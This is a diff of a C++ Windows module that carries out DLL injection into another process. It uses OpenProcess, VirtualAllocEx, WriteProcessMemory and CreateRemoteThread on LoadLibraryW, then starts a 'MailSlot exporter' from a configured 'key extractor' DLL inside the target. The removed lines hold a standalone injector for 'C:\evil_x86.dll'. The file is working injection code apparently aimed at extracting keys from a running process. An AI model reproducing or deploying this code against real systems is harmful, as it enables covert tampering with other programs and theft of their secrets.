@@ -1,37 +1,73 @@
 #include <windows.h>
 #include <string>
+#include <psapi.h>
 
+#include <iostream>
 #include "program_result.h"
 #include "injection/interproc_coms.h"
 #include <injection/injector.h>
-#include "injector.h"
+#include <config.h>
 
+using namespace std;
 using namespace error_handling;
 
-char evilDLL[] = "C:\\evil_x86.dll";
-unsigned int evilLen = sizeof(evilDLL) + 1;
-
 namespace injection {
-ProgramResult InjectDLLOnProcess(DWORD pid, std::string dll_path) {
-  ProgramResult result = OkResult("Process injected");
-  // RETURN handle through arguments
-  HMODULE hKernel32 = GetModuleHandleA("Kernel32");
-  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
-  HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 
+void ShowGUIMessage(string message) {
+  MessageBoxA(NULL, message.c_str(), "Injected process", MB_OK);
+}
+
+bool IsDLLLoadedOnProcess(DWORD pid, wstring w_dll_path, HANDLE process_handle) {
+  if (!process_handle) return false;
+
+  HMODULE module_array[1024];
+  DWORD bytes_needed;
+  if (EnumProcessModulesEx(process_handle, module_array, sizeof(module_array), &bytes_needed, LIST_MODULES_ALL)) {
+    for (size_t i = 0; i < (bytes_needed / sizeof(HMODULE)); i++) {
+      WCHAR module_name[MAX_PATH];
+      if (GetModuleBaseNameW(process_handle, module_array[i], module_name, sizeof(module_name) / sizeof(WCHAR))) {
+        if (_wcsicmp(module_name, w_dll_path.c_str()) == 0) {
+          printf(" DLL found in process\n");
+          return true;
+        }
+      }
+    }
+  } else cerr << " [x] Failed to enumerate modules: " << GetLastErrorAsString() << endl;
+
+  return false;
+}
+
+ProgramResult InjectDLLOnProcess(DWORD pid, wstring w_dll_path) {
+  ProgramResult result = OkResult("Process injected");
+
+  // GET THE LOADLIBRARY OFFSET IN MEMORY
+  HMODULE k32_module = GetModuleHandleA("kernel32.dll");
+  if (k32_module == NULL) return ErrorResult("Could not load Kernel32 library");
+  LPTHREAD_START_ROUTINE load_library_func = (LPTHREAD_START_ROUTINE) GetProcAddress(k32_module, "LoadLibraryW");
+  if (load_library_func == NULL) return ErrorResult("Could not obtain LoadLibraryW offset");
+
+  HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
   if (process == NULL) return ErrorResult("[INJ] Could not open remote process");
 
+  if (!IsDLLLoadedOnProcess(pid, w_dll_path, process)) {
   // allocate memory buffer for remote process
-  LPVOID remote_buffer;
-  remote_buffer = VirtualAllocEx(process, NULL, dll_path.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-  if (remote_buffer != NULL) {
-    BOOL res = WriteProcessMemory(process, remote_buffer, dll_path.c_str(), dll_path.length(), NULL);
-    if (res != 0) {
-      HANDLE thread_handle = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)lb, remote_buffer, 0, NULL);
-      if (thread_handle == NULL) result = ErrorResult("[INJ] Failed to start a thread on the target process");
-      else CloseHandle(thread_handle);
-    } else result = ErrorResult("[INJ] Could not write into the remote buffer");
-  } else result = ErrorResult("[INJ] Failed to allocate memory in the remote process");
+    LPVOID remote_buffer;
+    SIZE_T size_in_bytes = (w_dll_path.length() + 1) * sizeof(wchar_t);
+    remote_buffer = VirtualAllocEx(process, NULL, size_in_bytes, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    if (remote_buffer) {
+      BOOL res = WriteProcessMemory(process, remote_buffer, w_dll_path.c_str(), size_in_bytes, NULL);
+      if (res) {
+        HANDLE thread_handle = CreateRemoteThread(process, NULL, 0, load_library_func, remote_buffer, 0, NULL);
+        if (!thread_handle) result = ErrorResult("[INJ] Failed to start a thread on the target process");
+        else {
+          WaitForSingleObject(thread_handle, INFINITE);
+          CloseHandle(thread_handle);
+        }
+      } else result = ErrorResult("[INJ] Could not write into the remote buffer");
+    } else result = ErrorResult("[INJ] Failed to allocate memory in the remote process");
+
+    if (!IsDLLLoadedOnProcess(pid, w_dll_path, process)) result = ErrorResult("The DLL was not found in the remote process after injection attempt");
+  } else result = OkResult("The DLL was already loaded on the process");
 
   CloseHandle(process);
   return result;
@@ -43,14 +79,21 @@ ProgramResult StartServer(DWORD pid, HANDLE* thread_handle) {
 }
 
 error_handling::ProgramResult StartMailSlotExporter(DWORD pid, HANDLE *thread_handle) {
-  // TODO get the DLL from a global config file
-  HMODULE injected_dll = LoadLibraryA("");
+  wstring w_dll_path = Config::Instance().GetKeyExtractorDLLPath();
+  HMODULE injected_dll = LoadLibraryW(w_dll_path.c_str());
+  if (injected_dll == NULL) 
+    return ErrorResult("Could not load the specified DLL");
+
   FARPROC start_server_function = GetProcAddress(injected_dll, "StartMailSlotExporter");
   FreeLibrary(injected_dll);
 
+  if (start_server_function == NULL) 
+    return ErrorResult("Failed to obtain server start function");
+
   // Open process
   HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-  if (process == NULL) return ErrorResult("Could not open remote process");
+  if (process == NULL) 
+    return ErrorResult("Could not open remote process");
 
   *thread_handle = CreateRemoteThread(
     process, NULL, 0,
@@ -63,68 +106,4 @@ error_handling::ProgramResult StartMailSlotExporter(DWORD pid, HANDLE *thread_ha
   else return OkResult("Successfully started MailSlot server on remote process");
 }
 
-ProgramResult StopServer(DWORD pid) {
-  // GetProcAddress to get the function and CreateRemoteThread to start it
-  return ErrorResult("Not implemented");
-}
-
 } // namespace injection
-
-int main(int argc, char* argv[]) {
-  HANDLE target_process; // process handle
-  HANDLE remote_thread; // remote thread
-  LPVOID remote_buffer; // remote buffer
-
-  // handle to kernel32 and pass it to GetProcAddress
-  HMODULE hKernel32 = GetModuleHandleA("Kernel32");
-  if (hKernel32 == NULL) {
-    printf("Could not initialize Kernel32\n");
-    return -1;
-  }
-  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
-  if (lb == NULL) {
-    printf("Could not initialize LoadLibraryA\n");
-    return -1;
-  }
-
-  // parse process ID
-  if ( atoi(argv[1]) == 0) {
-      printf("PID not found :( exiting...\n");
-      return -1;
-  }
-  printf("PID: %i\n", atoi(argv[1]));
-  target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
-  if (target_process == NULL) {
-    printf(" [x] Error while opening the process\n");
-  } else printf("[i] Process opened with full access\n");
-
-  // allocate memory buffer for remote process
-  remote_buffer = VirtualAllocEx(target_process, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-  if (remote_buffer == NULL) {
-    printf(" [x] Error while allocating space in the process\n");
-  } else printf(" [i] Successfully allocated memory in the target process\n");
-
-  // "copy" evil DLL between processes
-  BOOL res = WriteProcessMemory(target_process, remote_buffer, evilDLL, evilLen, NULL);
-  if (res == NULL) {
-    printf(" [x] Error while writing memory to the target process\n");
-  } else printf(" [i] DLL path copied to the target process\n");
-
-  // our process start new thread
-  remote_thread = CreateRemoteThread(target_process, NULL, 0, (LPTHREAD_START_ROUTINE)lb, remote_buffer, 0, NULL);
-  if (remote_thread == NULL) {
-    printf(" [x] Error creating thread in target process. Windows error: %s\n", error_handling::GetLastErrorAsString().c_str());
-  } else printf(" [i] Created thread in target process\n");
-  
-  HMODULE evil_dll = LoadLibraryA(evilDLL);
-  if (evil_dll != NULL) {
-    printf(" [i] Loaded DLL in current process\n");
-    FARPROC start_server_func = GetProcAddress(evil_dll, "StartServer");
-    HANDLE res = CreateRemoteThread(target_process, NULL, 0, (LPTHREAD_START_ROUTINE) start_server_func, NULL, 0, NULL);
-    if (res == NULL) printf(" [x] Successfully started thread with server on tje target process");
-    else printf(" [x] Error starting new thread on the target process\n");
-  } else printf("[x] Error loading custom DLL");
-  
-  CloseHandle(target_process);
-  return 0;
-}
